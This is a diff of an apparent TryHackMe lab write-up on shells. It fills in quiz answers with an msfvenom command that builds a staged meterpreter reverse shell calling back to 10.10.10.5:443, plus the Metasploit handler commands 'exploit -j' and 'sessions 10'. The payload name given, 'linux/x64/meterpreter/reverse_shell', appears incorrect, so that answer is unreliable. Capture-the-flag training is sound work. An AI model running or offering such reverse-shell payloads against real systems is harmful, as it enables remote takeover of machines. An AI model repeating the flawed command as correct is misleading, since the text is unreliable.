@@ -515,15 +515,14 @@ This gives us a full set of Linux meterpreter payloads for 32bit targets.
 
 * Generate a staged reverse shell for a 64 bit Windows target, in a `.exe` format using your TryHackMe tun0 IP address and a chosen port.
 
-	``
 
 * Which symbol is used to show that a shell is stageless?
 
-	``
+	`_`
 
 * What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`
 
-	``
+	`msfvenom -p linux/x64/meterpreter/reverse_shell -f elf -o shell LHOST=10.10.10.5 LPORT=443`
 
 ## Task 10 - Metasploit multi/handler
 
@@ -562,11 +561,11 @@ Notice that, because the multi/handler was originally backgrounded, we needed to
 
 * What command can be used to start a listener in the background?
 
-	``
+	`exploit -j`
 
 * If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?
 
-	``
+	`sessions 10`
 
 ## Task 11 - WebShells
 
